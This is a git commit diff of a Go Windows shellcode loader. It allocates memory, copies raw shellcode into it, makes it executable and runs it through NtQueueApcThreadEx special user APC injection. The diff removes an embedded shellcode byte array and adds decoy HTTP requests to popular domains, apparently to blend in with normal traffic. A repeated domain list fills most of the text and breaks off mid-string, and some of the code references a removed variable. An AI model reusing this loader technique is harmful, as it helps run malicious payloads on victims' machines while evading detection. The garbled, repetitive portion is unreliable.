b769d0529763726cab9c6e6b43a9e01a84afcd4a
hututu4841 <w02588520@qq.com>
2025-04-01 16:04:56 +0800

    更新 main.go 文件

--- main.go
+++ main.go
@@ -26,39 +26,35 @@ const (
 )
 
 func main() {
-	var verbose = flag.Bool("verbose", false, "Enable verbose output")
-	var debug = flag.Bool("debug", false, "Enable debug output")
+	verbose := flag.Bool("verbose", false, "Enable verbose output")
+	debug := flag.Bool("debug", false, "Enable debug output")
 	flag.Parse()
-
-	var shellcode = []byte{0x33, 0xc0, 0x50, 0xb8, 0x2e, 0x64, 0x6c, 0x6c, 0x50, 0xb8, 0x65, 0x6c, 0x33, 0x32, 0x50, 0xb8, 0x6b, 0x65, 0x72, 0x6e, 0x50, 0x8b, 0xc4, 0x50, 0xb8, 0x7b, 0x1d, 0x80, 0x7c, 0xff, 0xd0, 0x33, 0xc0, 0x50, 0xb8, 0x2e, 0x65, 0x78, 0x65, 0x50, 0xb8, 0x63, 0x61, 0x6c, 0x63, 0x50, 0x8b, 0xc4, 0x6a, 0x05, 0x50, 0xb8, 0xad, 0x23, 0x86, 0x7c, 0xff, 0xd0, 0x33, 0xc0, 0x50, 0xb8, 0xfa, 0xca, 0x81, 0x7c, 0xff, 0xd0}
-
-	go periodicNetworkRequests()
 
 	if *debug {
 		fmt.Println("[DEBUG]Loading kernel32.dll and ntdll.dll...")
 	}
-	var kernel32 = windows.NewLazySystemDLL("kernel32.dll")
-	var ntdll = windows.NewLazySystemDLL("ntdll.dll")
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 
 	if *debug {
 		fmt.Println("[DEBUG]Loading VirtualAlloc, VirtualProtect, and RtlCopyMemory procedures...")
 	}
-	var VirtualAlloc = kernel32.NewProc("VirtualAlloc")
-	var VirtualProtect = kernel32.NewProc("VirtualProtect")
-	var GetCurrentThread = kernel32.NewProc("GetCurrentThread")
-	var RtlCopyMemory = ntdll.NewProc("RtlCopyMemory")
-	var NtQueueApcThreadEx = ntdll.NewProc("NtQueueApcThreadEx")
+	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
+	VirtualProtect := kernel32.NewProc("VirtualProtect")
+	GetCurrentThread := kernel32.NewProc("GetCurrentThread")
+	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
+	NtQueueApcThreadEx := ntdll.NewProc("NtQueueApcThreadEx")
 
 	if *debug {
 		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode...")
 	}
-	var ret, _, errVirtualAlloc uintptr = VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 
-	if errVirtualAlloc!= nil {
+	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
 		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
 	}
 
-	if ret == 0 {
+	if addr == 0 {
 		log.Fatal("[!]VirtualAlloc failed and returned 0")
 	}
 
@@ -69,9 +65,9 @@ func main() {
 	if *debug {
 		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory...")
 	}
-	var _, _, errRtlCopyMemory uintptr = RtlCopyMemory.Call(ret, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 
-	if errRtlCopyMemory!= nil {
+	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
 		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
 	}
 	if *verbose {
@@ -81,9 +77,10 @@ func main() {
 	if *debug {
 		fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ...")
 	}
-	var oldProtect = PAGE_READWRITE
-	var _, _, errVirtualProtect uintptr = VirtualProtect.Call(ret, uintptr(len(shellcode)), PAGE_EXECUTE, uintptr(unsafe.Pointer(&oldProtect)))
-	if errVirtualProtect!= nil {
+
+	oldProtect := PAGE_READWRITE
+	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
 		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
 	}
 	if *verbose {
@@ -93,9 +90,9 @@ func main() {
 	if *debug {
 		fmt.Println("[DEBUG]Calling GetCurrentThread...")
 	}
-	var thread, _, err uintptr = GetCurrentThread.Call()
-	if err != 0 {
-		log.Fatal(fmt.Sprintf("Error calling GetCurrentThread:\n%s", err.Error()))
+	thread, _, err := GetCurrentThread.Call()
+	if err.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("Error calling GetCurrentThread:\n%s", err))
 	}
 	if *verbose {
 		fmt.Printf("[-]Got handle to current thread: %v\n", thread)
@@ -104,9 +101,9 @@ func main() {
 	if *debug {
 		fmt.Println("[DEBUG]Calling NtQueueApcThreadEx...")
 	}
-	var _, _, e uintptr = NtQueueApcThreadEx.Call(thread, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, ret, 0, 0, 0)
-	if e != 0 {
-		log.Fatal(fmt.Sprintf("Error calling NtQueueApcThreadEx:\n%s", e.Error()))
+	_, _, err = NtQueueApcThreadEx.Call(thread, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, uintptr(addr), 0, 0, 0)
+	if err.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("Error calling NtQueueApcThreadEx:\n%s", err))
 	}
 	if *verbose {
 		fmt.Println("[-]Queued special user APC")
@@ -117,35 +114,29 @@ func main() {
 	}
 }
 
-func periodicNetworkRequests() {
-	defer func() { <-done }()
-	ticker := time.NewTicker(5 * time.Minute)
-	defer ticker.Stop()
+func init() {
+	rand.Seed(time.Now().UnixNano())
+}
 
-	for range ticker.C {
-		rand.Seed(time.Now().UnixNano())
-		domains := getRandomAlexaDomains(3)
-		wg := &sync.WaitGroup{}
-		wg.Add(len(domains))
+func fetchRandomURLs() {
+	numUrls := 3
+	urls := make([]string, numUrls)
 
-		for _, domain := range domains {
-			go func(d string) {
-				defer wg.Done()
-				// Simulate network request
-				time.Sleep(time.Duration(rand.Intn(time.Second)))
-			}(domain)
-		}
+	for i := 0; i < numUrls; i++ {
+		urls[i] = fmt.Sprintf("https://%s.com", getRandomDomain())
+	}
 
-		wg.Wait()
+	for _, url := range urls {
+		go func(url string) {
+			resp, err := http.Get(url)
+			if err != nil {
+				log.Printf("Error fetching %s: %s", url, err)
+			} else {
+				defer resp.Body.Close()
+			}
+		}(url)
 	}
 }
 
-func getRandomAlexaDomains(count int) []string {
-	// Placeholder for actual Alexa Top 100 domains
-	alexaDomains := []string{"google.com", "facebook.com", "youtube.com", "amazon.com", "wikipedia.org", "wechat.com", "tencent.com", "baidu.com", "qq.com", "yahoo.com"}
-	rand.Seed(time.Now().UnixNano())
-	rand.Shuffle(len(alexaDomains), func(i, j int) {
-		alexaDomains[i], alexaDomains[j] = alexaDomains[j], alexaDomains[i]
-	})
-	return alexaDomains[:count]
-}
+func getRandomDomain() string {
+	domains := []string{"google", "facebook", "amazon", "youtube", "twitter", "wikipedia", "qq", "taobao", "baidu", "jd", "alibaba", "sina", "sohu", "netease", "tencent", "wechat", "linkedin", "github", "reddit", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter
